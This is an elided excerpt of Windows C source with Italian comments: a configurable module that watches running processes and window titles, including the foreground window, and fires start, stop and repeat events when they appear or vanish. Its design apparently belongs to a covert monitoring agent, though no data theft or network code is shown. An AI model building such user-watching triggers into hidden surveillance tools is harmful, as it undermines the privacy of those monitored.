...
static HANDLE em_mp_monproc_thread = 0;
static DWORD proc_table_count = 0;
static monitored_proc* proc_table = NULL;

static BOOL em_mp_cp = FALSE;
...
static BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam)
{
	...
	if (CmpWildW(proc_table[param->index].proc_name, window_name))
	{
		param->found = TRUE;
		return FALSE;
	}
...
static BOOL CmpFrontWindowName(WCHAR* str)
{
	HWND front_wind;
	WCHAR window_name[256];
...
static BOOL CmpFrontProcName(WCHAR* str)
{
...
static DWORD WINAPI MonitorProcesses(LPVOID lpParameter)
{
	HANDLE proc_snap;
	PROCESSENTRY32W lppe;
	DWORD index;
	BOOL process_found;
	EnumWindowParam enum_win_par;
	...
	LOOP
	{
		...
		for (index = 0; index < proc_table_count; index++) {
			// Solo se cerchiamo il nome della finestra
			if (!proc_table[index].isWindow)
				continue;
			enum_win_par.index = index;
			enum_win_par.found = FALSE;

			if (!proc_table[index].isForeground)
			{
			...
			else
			{
				...
				enum_win_par.found = CmpFrontWindowName(proc_table[index].proc_name);
			}

			if (enum_win_par.found && !proc_table[index].present) {
				proc_table[index].present = TRUE;
				TriggerEvent(proc_table[index].event_param.start_action, proc_table[index].event_id);
			
				CreateRepeatThread(proc_table[index].event_id, &proc_table[index].event_param);
			}

			if (!enum_win_par.found && proc_table[index].present) {
				proc_table[index].present = FALSE;
				StopRepeatThread(proc_table[index].event_id);
				TriggerEvent(proc_table[index].event_param.stop_action, proc_table[index].event_id);
			}
		}
		...
		for (index = 0; index < proc_table_count; index++) {
			...
			if (proc_table[index].isForeground) {
				process_found = CmpFrontProcName(proc_table[index].proc_name);

				if (process_found && !proc_table[index].present) {
					proc_table[index].present = TRUE;
					TriggerEvent(proc_table[index].event_param.start_action, proc_table[index].event_id);
					CreateRepeatThread(proc_table[index].event_id, &proc_table[index].event_param);
				}
			...
			if (FNC(Process32FirstW)(proc_snap,  &lppe)) {
				...
				do {
					...
					if (CmpWildW(proc_table[index].proc_name, lppe.szExeFile)) {
						// Se il processo e' presente e non era ancora stato rilevato, lancia il primo evento
						if (!proc_table[index].present) {
							proc_table[index].present = TRUE;
							TriggerEvent(proc_table[index].event_param.start_action, proc_table[index].event_id);
							CreateRepeatThread(proc_table[index].event_id, &proc_table[index].event_param);
						}
				...
				if (proc_table[index].present && !process_found) {
					proc_table[index].present = FALSE;
					StopRepeatThread(proc_table[index].event_id);
					TriggerEvent(proc_table[index].event_param.stop_action, proc_table[index].event_id);
				}
...
void WINAPI EM_MonProcAdd(cJSON *conf_json, EVENT_PARAM* event_param, DWORD event_id)
{
	...
	if (!(temp_table = realloc(proc_table, (proc_table_count + 1) * sizeof(monitored_proc))))
		return;

	proc_table = (monitored_proc*)temp_table;
	memcpy(&proc_table[proc_table_count].event_param, event_param, sizeof(EVENT_PARAM));
	proc_table[proc_table_count].event_id = event_id;
	proc_table[proc_table_count].proc_name = cJSON_GetWideStringValue(cJSON_GetObjectItem(conf_json, "process"));
	proc_table[proc_table_count].isWindow = cJSON_IsTrue(cJSON_GetObjectItem(conf_json, "window"));
	proc_table[proc_table_count].isForeground = cJSON_IsTrue(cJSON_GetObjectItem(conf_json, "focus"));
	proc_table[proc_table_count].present = FALSE;
...
void WINAPI EM_MonProcStop()
{
	...
	for (DWORD i = 0; i < proc_table_count; i++)
		StopRepeatThread(proc_table[i].event_id);

	// Libera tutte le strutture allocate
	for (DWORD i = 0; i < proc_table_count; i++)
		SAFE_FREE(proc_table[i].proc_name);
	SAFE_FREE(proc_table);
	proc_table_count = 0;
}
